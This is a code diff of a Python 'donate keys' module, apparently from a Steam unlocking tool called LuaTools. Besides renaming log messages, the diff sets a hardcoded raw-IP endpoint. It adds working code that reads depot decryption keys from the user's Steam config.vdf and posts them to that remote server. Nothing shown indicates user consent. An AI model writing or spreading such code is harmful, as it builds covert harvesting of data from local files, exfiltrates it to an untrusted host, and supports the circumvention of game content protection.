@@ -1,4 +1,4 @@
-"""Donate keys functionality for MLZ backend."""
+"""Donate keys functionality for LuaTools backend."""
 
 from __future__ import annotations
 
@@ -13,7 +13,7 @@ from logger import logger
 # Import private VDF parser - it's used internally for config.vdf parsing
 from steam_utils import _parse_vdf_simple  # type: ignore
 
-DONATION_URL = ""
+DONATION_URL = "http://167.235.229.108/donatekeys/send"
 DONATION_HEADERS = {
     "Content-Type": "text/plain",
     "User-Agent": USER_AGENT,
@@ -65,20 +65,20 @@ def parse_config_vdf_decryption_keys(steam_path: str) -> List[Tuple[str, str]]:
     config_path = os.path.join(steam_path, "config", "config.vdf")
     
     if not os.path.exists(config_path):
-        logger.warn(f"MLZ: config.vdf not found at {config_path}")
+        logger.warn(f"LuaTools: config.vdf not found at {config_path}")
         return []
     
     try:
         with open(config_path, "r", encoding="utf-8") as handle:
             vdf_content = handle.read()
     except Exception as exc:
-        logger.warn(f"MLZ: Failed to read config.vdf: {exc}")
+        logger.warn(f"LuaTools: Failed to read config.vdf: {exc}")
         return []
     
     try:
         vdf_data = _parse_vdf_simple(vdf_content)
     except Exception as exc:
-        logger.warn(f"MLZ: Failed to parse config.vdf: {exc}")
+        logger.warn(f"LuaTools: Failed to parse config.vdf: {exc}")
         return []
     
     pairs: List[Tuple[str, str]] = []
@@ -119,10 +119,10 @@ def extract_valid_decryption_keys(steam_path: str) -> List[Tuple[str, str]]:
         List of valid (appid, decryption_key) tuples
     """
     if not steam_path or not os.path.exists(steam_path):
-        logger.warn(f"MLZ: Invalid Steam path for donate keys: {steam_path}")
+        logger.warn(f"LuaTools: Invalid Steam path for donate keys: {steam_path}")
         return []
     
-    logger.log("MLZ: Starting donate keys extraction...")
+    logger.log("LuaTools: Starting donate keys extraction...")
     
     all_pairs = parse_config_vdf_decryption_keys(steam_path)
     valid_pairs: List[Tuple[str, str]] = []
@@ -132,11 +132,11 @@ def extract_valid_decryption_keys(steam_path: str) -> List[Tuple[str, str]]:
             valid_pairs.append((appid, key))
         else:
             logger.log(
-                f"MLZ: Invalid appid/key pair skipped: appid={appid!r}, "
+                f"LuaTools: Invalid appid/key pair skipped: appid={appid!r}, "
                 f"key_len={len(key)}, key_valid={bool(re.match(r'^[a-zA-Z0-9]+$', key))}"
             )
     
-    logger.log(f"MLZ: Found {len(valid_pairs)} valid decryption key pairs")
+    logger.log(f"LuaTools: Found {len(valid_pairs)} valid decryption key pairs")
     return valid_pairs
 
 
@@ -167,14 +167,14 @@ def send_donation_keys(pairs: List[Tuple[str, str]]) -> bool:
         True if request succeeded (200 response), False otherwise
     """
     if not pairs:
-        logger.log("MLZ: No keys to donate")
+        logger.log("LuaTools: No keys to donate")
         return False
     
     try:
         formatted_data = format_keys_for_donation(pairs)
         client = get_http_client()
         
-        logger.log(f"MLZ: Sending {len(pairs)} appid/key pairs to donation endpoint...")
+        logger.log(f"LuaTools: Sending {len(pairs)} appid/key pairs to donation endpoint...")
         
         response = client.post(
             DONATION_URL,
@@ -184,15 +184,15 @@ def send_donation_keys(pairs: List[Tuple[str, str]]) -> bool:
         
         status_code = response.status_code
         count = len(pairs)
-        logger.log(f"MLZ: Donated AppIDs : {count} - Resp : {status_code}")
+        logger.log(f"LuaTools: Donated AppIDs : {count} - Resp : {status_code}")
         
         if status_code == 200:
             return True
         else:
-            logger.log(f"MLZ: Donation request status : {status_code}")
+            logger.log(f"LuaTools: Donation request status : {status_code}")
             return False
             
     except Exception as exc:
-        logger.warn(f"MLZ: Failed to send donation keys: {exc}")
+        logger.warn(f"LuaTools: Failed to send donation keys: {exc}")
         return False
 
